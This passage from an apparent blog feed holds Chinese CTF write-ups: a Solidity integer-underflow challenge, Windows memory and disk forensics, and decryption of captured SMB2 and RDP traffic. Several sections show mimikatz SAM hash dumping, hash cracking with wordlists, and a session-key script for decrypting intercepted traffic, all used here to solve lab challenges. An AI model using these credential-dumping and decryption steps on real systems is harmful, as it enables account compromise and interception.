amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(balance[msg.sender] == 114514);</span><br><span class="line">        solve=true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看合约代码。Get函数为初始化balance为50，check函数为检查余额是否为114514，当余额为114514时，isSolved函数返回true。</p><p>主要是Transfer函数，用于向某个地址转账，但这里做了一系列的限制。要求转账金额、转账前余额、转账后余额都大于0，另外要求当前发起转账的用户地址后两位为ef。</p><p>这里有两个考点，一个是整数溢出，我们可以注意到solidity版本为0.7.0，balance和amount的类型都为uint256，即数据大小在0~2<strong>256之间。代码中有balance[msg.sender] - amount &gt; 0的要求，但是如果amount &gt; balance[msg.sender]，那么会发生什么？显然值并不会变为负数，这里值会直接变成2</strong>256 - amount + balance[msg.sender]。因此，我们只要使amount的值为2**256-114514+50即可。这里其实有些师傅是想复杂了。</p><p>另外一个考点其实是虚荣地址（vanity address），也就是后来给的hint中所指的。虚荣地址就是用户自己生成的具有某一特殊组合的地址，google一下其实不难找到有一个在线网站<a href="https://vanity-eth.tk/%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90%E8%99%9A%E8%8D%A3%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82">https://vanity-eth.tk/可以生成虚荣地址，如下图所示。</a></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638728-327e8e05-2164-421e-b8c2-81309a7811f7.png" alt="img"></p><p>  但其实自己或者让GPT帮忙搓一个脚本其实也不难（出题人问GPT一次就成功了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_address_ending_with_ef</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        private_key = <span class="string">&#x27;0x&#x27;</span> + secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">        account = Account.from_key(private_key)</span><br><span class="line">        address = account.address</span><br><span class="line">        <span class="keyword">if</span> address.endswith(<span class="string">&#x27;ef&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> private_key, address</span><br><span class="line">private_key, address = find_address_ending_with_ef()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private Key: <span class="subst">&#123;private_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Address: <span class="subst">&#123;address&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>接下来导入私钥就可以用了。</p><p>先get</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638944-325a6559-7d5c-4154-8f44-d22f7e27c3c7.png" alt="img"></p><p>然后transact，to的地址随便填就行</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638960-23d069d1-2007-4f70-9ffb-c17ea52de29c.png" alt="img"></p><p>再check，可以看到isSolved返回了true</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130639090-ebecaa01-9f1c-494e-901d-6387685072fe.png" alt="img"></p><p>拿到flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130639424-f594014e-b307-47db-ae07-36214572457e.png" alt="img"></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="画画的baby"><a href="#画画的baby" class="headerlink" title="画画的baby"></a>画画的baby</h3><p>附件给了一个内存文件，本题直接用volatility2或volatility3都能完成</p><p>volatility2：</p><p>先找到内存的profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw imageinfo</span><br></pre></td></tr></table></figure><p>之后经过一些尝试，在查看进程的时候可以发现有一个<code>mspaint.exe</code>的进程，查阅资料可以知道这是windows自带的一个画图软件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 pslist</span><br><span class="line">......</span><br><span class="line">0xffffe70970c0c340 mspaint.exe            5372   3912      7        0      1      0 2024-09-06 14:36:00 UTC+0000</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>把对应的进程提取到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 memdump -p 3912 -D ./</span><br></pre></td></tr></table></figure><p>改后缀为<code>.data</code>，再用gimp打开调调宽高和位移就能看到当时的画：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638260-0f5f65e1-33f1-4fb8-be8e-7e4d29b0c1ab.png" alt="img"></p><p>volatility3:</p><p>操作其实都差不多，不过volatility3不需要指定windows的profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.pslist</span><br><span class="line">......</span><br><span class="line">5372    3912    mspaint.exe     0xe70970c0c340  7       -       1       False   2024-09-06 14:36:00.000000      N/A     Disabled</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>再把进程提取到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.memmap --pid 5372 --dump</span><br></pre></td></tr></table></figure><p>gimp调位移和宽高：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638768-b236d4dc-31cf-48b1-9f8a-c25f92b01f43.png" alt="img"></p><p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p><h3 id="FBI-Open-The-Door-1"><a href="#FBI-Open-The-Door-1" class="headerlink" title="FBI Open The Door!! 1*"></a>FBI Open The Door!! 1*</h3><blockquote><p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p></blockquote><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644424-a5f29b98-5285-4776-8008-70a6ff866431.png" alt="img"></p><p>将检材下载下来求一下SHA256校验值即可</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644383-8db2fe63-3e4d-4480-a4c9-0a65180fc34c.png" alt="img"></p><p>0xGame{6d393b09ac01accf27bce07a9c07f5721b9e1e1fd5de1cc8cc1a2581a43e68f5}</p><h3 id="FBI-Open-The-Door-2"><a href="#FBI-Open-The-Door-2" class="headerlink" title="FBI Open The Door!! 2*"></a>FBI Open The Door!! 2*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644457-004db25d-16f6-4d8d-8f42-60ad7bc34975.png" alt="img"></p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>取证大师一把梭</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644587-a13ec229-1b63-402a-9c66-7e8b1699bab8.png" alt="img"></p><p>0xGame{F1sh1ng-s3v3r}</p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>使用FTK Imager打开：file–&gt;Add Evidence Item–&gt;Image File–&gt;Browse选择文件–&gt;Finish</p><p>在C:\Windows\System32\winevt\Logs路径下找到系统日志system.evtx </p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644955-c86b739b-09d8-4cb9-85ae-598e9ba37364.png" alt="img"></p><p>打开日志文件，查看事件ID为6011的日志，发现有一条修改主机名的记录，得到主机名</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644949-c913143e-9bb0-4a8b-b64f-b09722b9b40c.png" alt="img"></p><p>0xGame{F1sh1ng-s3v3r}</p><h3 id="FBI-Open-The-Door-3"><a href="#FBI-Open-The-Door-3" class="headerlink" title="FBI Open The Door!! 3*"></a>FBI Open The Door!! 3*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645036-1162dc1d-5338-4541-944c-92d54a394d7c.png" alt="img"></p><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>取证大师可以直接梭出用户St5rr的NTLM hash</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644951-7dacc63c-5453-4859-b50f-90cd69df1225.png" alt="img"></p><p>cmd5上查一下就有</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645161-02a54f7a-e6c8-460d-87a9-ccd73b41ada9.png" alt="img"></p><p>0xGame{zaq!xsw@}</p><h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>用ftk，在C:\Windows\System32\config下找到SYSTEM和SAM两个文件，导出</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645524-1f1b45f0-56ca-41f7-82f9-adf7dc9b9922.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645572-a6b82b41-3ca7-45a3-81dd-015d6c4a93c2.png" alt="img"></p><p>接下来使用一个叫作<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>的工具提取NTLM Hash。</p><p>运行的时候记得以管理员权限运行，然后依次运行下面两行神奇命令就能得到用户的NTLM Hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645600-dfd01aaa-fe3f-49ec-baed-cb2db86992ba.png" alt="img"></p><p>查cmd5</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645588-e179f20c-9aa3-47c7-876a-706c5b93fff7.png" alt="img"></p><p>0xGame{zaq!xsw@}</p><h3 id="FBI-Open-The-Door-4"><a href="#FBI-Open-The-Door-4" class="headerlink" title="FBI Open The Door!! 4*"></a>FBI Open The Door!! 4*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645621-1c89dc55-624d-4dfa-bc08-e5981a7a1c49.png" alt="img"></p><h4 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h4><p>取证大师一把梭</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646098-7ea3410c-3834-4fca-ae3a-2cd0e90ecd5d.png" alt="img"></p><p>0xGame{2024-10-23 14:50:40}</p><h4 id="法二-2"><a href="#法二-2" class="headerlink" title="法二"></a>法二</h4><p>用ftk，在C:\Windows\System32\config下找到SOFTWARE，导出</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646126-93c4cf47-8e2a-4b30-9df9-6794d706d54c.png" alt="img"></p><p>用kali自带的chntpw查看，用下面的两条奇妙命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chntpw -e SOFTWARE</span><br><span class="line">ls Microsoft\Windows NT\CurrentVersion</span><br></pre></td></tr></table></figure><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646207-1cd1c29a-eb21-446c-a849-167c74cfba77.png" alt="img"></p><p>可以看到InstallDate，是以时间戳的形式表示的，使用<a href="https://tool.lu/timestamp/">在线工具</a>进行转换，得到系统安装时间</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646152-98b761fc-391b-4b82-b6d4-c5bc203d4450.png" alt="img"></p><p>0xGame{2024-10-23 14:50:40}</p><h3 id="FBI-Open-The-Door-5"><a href="#FBI-Open-The-Door-5" class="headerlink" title="FBI Open The Door!! 5*"></a>FBI Open The Door!! 5*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646135-feb24c6a-7809-48eb-a6aa-b769b132ae95.png" alt="img"></p><p>可以在C:\Windows\Temp路径下找到gophish文件夹，将其导出。取证大师中的话可以更快找到这个路径。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646972-8ee81990-54af-4552-adab-e011c4277820.png" alt="img"></p><p>在接下来的步骤前，建议去了解一下gophish</p><p>文件夹中有个gophish.db，用navicat看一下</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646866-9fc719e8-ac25-4f96-acda-6c0254776258.png" alt="img"></p><p>在smtp表中找到password字段，这就是smtp授权码</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646930-3b5e372b-2c80-42c0-9df6-5494a3c31fef.png" alt="img"></p><p>0xGame{wpdqlnyvetqyddce}</p><h3 id="FBI-Open-The-Door-6"><a href="#FBI-Open-The-Door-6" class="headerlink" title="FBI Open The Door!! 6*"></a>FBI Open The Door!! 6*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646951-f88bd439-01b0-4467-a5bd-e4aa03d7e50f.png" alt="img"></p><p>接上一题，查看users表中的hash字段，这就是登录密码的哈希</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805647059-85491922-b06f-4245-b4b3-12915db1c3a9.png" alt="img"></p><p>网上搜索一下可以知道，这是bcrypt hash，明文肯定是弱口令，用hashcat或者jtr爆破一下就行，下面用jtr。将哈希值存成一个名为1.hash的文件，字典使用rockyou.txt。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805647497-a3ab4d75-c4bc-4aa2-9172-c4b737789ed9.png" alt="img"></p><p>0xGame{qwertyuiop}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2024 Misc 谍影重重5.0 Writeup</title>
      <link href="/2024/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/"/>
      <url>/2024/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次是跟hyperion打的，除了签到题就做了这一题，另有一题跟队友合作完成，这里就不放wp了<del>（我没写）</del></p></blockquote><h2 id="谍影重重5-0"><a href="#谍影重重5-0" class="headerlink" title="谍影重重5.0"></a>谍影重重5.0</h2><p>可以看到有很多被加密的SMB2流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765590-1fad5624-fbad-423b-bc56-c3d2ae528739.png" alt="img"></p><p>参考<a href="https://blog.nflabs.jp/entry/2022/12/12/094816">这篇文章</a></p><p>首先把NTLM hash提取出来，这里我用NTLMRawUnHide这个工具</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765757-b609ab05-8ace-4168-8537-8e6537ba628a.png" alt="img"></p><p>用hashcat爆破出明文密码babygirl233</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765626-839aa03a-e60b-4310-8180-9293103748e8.png" alt="img"></p><p>算一下nt</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805765593-3c21cc1d-db95-4b00-a1e4-f6b6a9a3074a.png" alt="img"></p><p>找到session key和ntproofstr</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766211-2a1f4c6f-5c58-4ebc-8575-b31ee2f7aa50.png" alt="img"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766232-ea64954f-dd65-4df9-bfdb-57dc4a2259a1.png" alt="img"></p><p>用脚本算得random sk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">#stolen from impacket. Thank you all for your wonderful contributions to the communitytry:</span><br><span class="line">    from Cryptodome.Cipher import ARC4</span><br><span class="line">    from Cryptodome.Cipher import DES</span><br><span class="line">    from Cryptodome.Hash import MD4</span><br><span class="line">except Exception:</span><br><span class="line">    LOG.critical(&quot;Warning: You don&#x27;t have any crypto installed. You need pycryptodomex&quot;)</span><br><span class="line">    LOG.critical(&quot;See https://pypi.org/project/pycryptodomex/&quot;)</span><br><span class="line"></span><br><span class="line">def generateEncryptedSessionKey(keyExchangeKey, exportedSessionKey):</span><br><span class="line">   cipher = ARC4.new(keyExchangeKey)</span><br><span class="line">   cipher_encrypt = cipher.encrypt</span><br><span class="line"></span><br><span class="line">   sessionKey = cipher_encrypt(exportedSessionKey)</span><br><span class="line">   return sessionKey</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=&quot;Calculate the Random Session Key based on data from a PCAP (maybe).&quot;)</span><br><span class="line">parser.add_argument(&quot;-u&quot;,&quot;--user&quot;,required=True,help=&quot;User name&quot;)</span><br><span class="line">parser.add_argument(&quot;-d&quot;,&quot;--domain&quot;,required=True, help=&quot;Domain name&quot;)</span><br><span class="line">#parser.add_argument(&quot;-p&quot;,&quot;--password&quot;,required=True,help=&quot;Password of User&quot;)</span><br><span class="line">parser.add_argument(&quot;-H&quot;,&quot;--hash&quot;,required=True,help=&quot;NTLM hash of User&quot;)</span><br><span class="line">parser.add_argument(&quot;-n&quot;,&quot;--ntproofstr&quot;,required=True,help=&quot;NTProofStr. This can be found in PCAP (provide Hex Stream)&quot;)</span><br><span class="line">parser.add_argument(&quot;-k&quot;,&quot;--key&quot;,required=True,help=&quot;Encrypted Session Key. This can be found in PCAP (provide Hex Stream)&quot;)</span><br><span class="line">parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;store_true&quot;, help=&quot;increase output verbosity&quot;)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">#Upper Case User and Domain</span><br><span class="line">user = str(args.user).upper().encode(&#x27;utf-16le&#x27;)</span><br><span class="line">domain = str(args.domain).upper().encode(&#x27;utf-16le&#x27;)</span><br><span class="line"></span><br><span class="line">#Create &#x27;NTLM&#x27; Hash of password#passw = args.password.encode(&#x27;utf-16le&#x27;)#hash1 = hashlib.new(&#x27;md4&#x27;, passw)#password = hash1.digest()</span><br><span class="line">password = args.hash.decode(&#x27;hex&#x27;)</span><br><span class="line"></span><br><span class="line">#Calculate the ResponseNTKey</span><br><span class="line">h = hmac.new(password, digestmod=hashlib.md5)</span><br><span class="line">h.update(user+domain)</span><br><span class="line">respNTKey = h.digest()</span><br><span class="line"></span><br><span class="line">#Use NTProofSTR and ResponseNTKey to calculate Key Excahnge Key</span><br><span class="line">NTproofStr = args.ntproofstr.decode(&#x27;hex&#x27;)</span><br><span class="line">h = hmac.new(respNTKey, digestmod=hashlib.md5)</span><br><span class="line">h.update(NTproofStr)</span><br><span class="line">KeyExchKey = h.digest()</span><br><span class="line"></span><br><span class="line">#Calculate the Random Session Key by decrypting Encrypted Session Key with Key Exchange Key via RC4</span><br><span class="line">RsessKey = generateEncryptedSessionKey(KeyExchKey,args.key.decode(&#x27;hex&#x27;))</span><br><span class="line"></span><br><span class="line">if args.verbose:</span><br><span class="line">    print &quot;USER WORK: &quot; + user + &quot;&quot; + domain</span><br><span class="line">    print &quot;PASS HASH: &quot; + password.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;RESP NT:   &quot; + respNTKey.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;NT PROOF:  &quot; + NTproofStr.encode(&#x27;hex&#x27;)</span><br><span class="line">    print &quot;KeyExKey:  &quot; + KeyExchKey.encode(&#x27;hex&#x27;)    </span><br><span class="line">print &quot;Random SK: &quot; + RsessKey.encode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766582-1bce6541-8386-45c9-9760-36039876d46a.png" alt="img"></p><p>再找到session id，以大端序排列，在wireshark中导入，解密smb2流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766404-fc9ad449-b288-49c4-8fa4-546edf2eba15.png" alt="img"></p><p>导出smb2传输的文件，一个需要密码的flag.7z，还有远程桌面连接的私钥文件LOCAL_MACHINE_Remote_Desktop_0_DESKTOP-J0EE9MR.pfx</p><p>接下来是解密RDP流量，其中pfx需要密码，经过查询不难猜得这里的密码是mimikatz，成功解密RDP流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766346-65ab08d5-1af7-4ebf-964a-b449e4ccce11.png" alt="img"></p><p>后面也许有更好的办法，但这里我是手动提取的。</p><p>用rdp.fastpath.scancode.keycode过滤出记录了按键的流量</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766947-5e0204f8-bdeb-4e5f-9729-df08598b8c7d.png" alt="img"></p><p>展开下面的RDP，可以看到每个流都记录了一个keycode</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/1730805766930-ade97052-ebc8-4584-904b-55bd506cccdd.png" alt="img"></p><p>这里我手动把每一个keycode提取了出来，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1c 0x14 0x23 0x12 0x2a 0x39 0x08 0x2c 0x39 0x19 0x1e 0x1f 0x1f 0x11 0x18 0x13 0x20 0x39 0x17 0x1f 0x39 0x21 0x28 0x2a 0x1a 0x11 0x17 0x31 0x20 0x18 0x11 0x1f 0x2a 0x0c 0x19 0x1e 0x1f 0x1f 0x11 0x18 0x13 0x20 0x2a 0x1b 0x0a 0x04 0x05 0x08 0x0b 0x02 0x04 0x02 0x09 0x03 0x28 0x1d 0x1f</span><br></pre></td></tr></table></figure><p>将其转换成对应的按键，去除一些行为艺术的按键，可以得到如下一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the 7z password is windowspassword9347013182</span><br></pre></td></tr></table></figure><p>因此密码就是babygirl2339347013182，解压得flag</p><p>flag{fa32a0b2-dc26-41f9-a5cc-1a48ca7b2ddd}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BuildCTF2024 Writeup</title>
      <link href="/2024/10/29/BuildCTF2024-Writeup/"/>
      <url>/2024/10/29/BuildCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<p>花了一晚上简单看了看，一眼看不出来的就没做，所以就做了这么点题，wp比较潦草。。。</p><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/BuildCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BuildCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态2024 初赛Misc Writeup+复现</title>
      <link href="/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h4><p>签到题</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021145506092.png" alt="image-20241021145506092"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ezflag"><a href="#ezflag" class="headerlink" title="ezflag"></a>ezflag</h4><p>追踪一下tcp流，一眼看到pk，得知是传了一个压缩包，提取出来</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021153738034.png" alt="image-20241021153738034"></p><p>解压出来的flag.zip没法解压，丢进010看一下，发现这其实是个png</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021153943922.png" alt="image-20241021153943922"></p><p>改后缀名为.png即可看到flag</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021154025231.png" alt="image-20241021154025231"></p><h4 id="Pvz"><a href="#Pvz" class="headerlink" title="Pvz"></a>Pvz</h4><p>提示说压缩包密码是pvz图中消耗阳光数的md5值，懒得去算，直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_passwords</span>(<span class="params">zip_file_path, start, end,tar</span>):</span><br><span class="line">    <span class="keyword">with</span> pyzipper.AESZipFile(zip_file_path, <span class="string">&#x27;r&#x27;</span>, 